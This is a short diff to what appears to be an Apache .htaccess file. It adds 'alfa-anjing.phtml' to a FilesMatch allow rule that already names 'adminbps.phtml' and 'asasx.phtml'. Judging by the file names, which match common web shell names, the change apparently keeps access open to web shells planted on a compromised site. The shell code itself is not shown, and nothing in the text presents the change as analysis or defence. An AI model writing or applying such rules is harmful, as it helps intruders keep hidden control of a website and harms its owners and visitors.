@@ -6,7 +6,7 @@
 
 </FilesMatch>
 
-<FilesMatch "^(index.html|sitemap.xml|adminbps.phtml|asasx.phtml)$">
+<FilesMatch "^(index.html|alfa-anjing.phtml|sitemap.xml|adminbps.phtml|asasx.phtml)$">
 
  Order allow,deny
 
